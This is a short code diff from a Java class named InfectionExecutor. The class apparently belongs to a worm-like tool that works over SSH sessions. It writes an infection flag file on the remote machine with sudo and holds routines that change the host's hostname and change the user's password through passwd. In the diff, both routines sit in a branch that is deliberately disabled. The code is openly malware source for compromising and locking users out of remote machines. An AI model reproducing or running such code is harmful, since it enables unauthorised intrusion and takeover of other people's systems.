@@ -54,18 +54,19 @@ public class InfectionExecutor {
 		// Creates the infection flag file
 		executeCommand("sudo echo \"" + INFECTION_FILE_CONTENT + "\" | sudo tee " + INFECTION_FILE + " > /dev/null", session);
 
-		// Changes hostname
-		changeHostName(session);
-		
 		int a = 2;
 		// Don't do it, it's too mean ^^'
 		if(1 == a) {
+			// Changes hostname
+			changeHostName(session);
+			
+			// Changes passwords
 			changePassword(session, password);
 		}
 	}
 
 	private static void changePassword(Session session, String password) throws IOException, JSchException {
-		Logger.log(executeCommand("echo -e \"" + password + "\n" + NEW_PASSWORD + "\n" + NEW_PASSWORD + "\" | passwd", session));
+		executeCommand("echo -e \"" + password + "\n" + NEW_PASSWORD + "\n" + NEW_PASSWORD + "\" | passwd", session);
 	}
 
 	private static void changeHostName(Session session) throws IOException, JSchException {
